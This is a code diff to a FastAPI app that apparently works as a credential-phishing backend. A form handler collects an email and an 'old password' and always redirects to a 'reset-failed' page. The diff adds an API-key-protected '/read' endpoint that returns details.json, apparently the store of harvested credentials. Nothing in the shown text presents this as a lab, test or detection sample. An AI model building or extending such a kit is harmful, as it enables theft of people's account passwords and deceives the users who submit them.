@@ -1,6 +1,12 @@
-from fastapi import FastAPI, Form
+import os
+
+from fastapi import FastAPI, Form, Header, HTTPException
 from fastapi.responses import HTMLResponse, RedirectResponse
 import json
+from dotenv import load_dotenv
+
+
+load_dotenv()
 
 app = FastAPI()
 
@@ -32,3 +38,12 @@ async def submit_form(email: str = Form(...), old_password: str = Form(...)):
 
     # After submit, always go to a logical ROUTE
     return RedirectResponse(url="/reset-failed", status_code=303)
+
+
+@app.get("/read")
+async def read_details(x_api_key: str = Header(...)):
+    if x_api_key != os.getenv("MY_API_KEY"):
+        raise HTTPException(status_code=401, detail="Unauthorized: Invalid API Key")
+
+    with open("details.json", "r") as f:
+        return json.load(f)
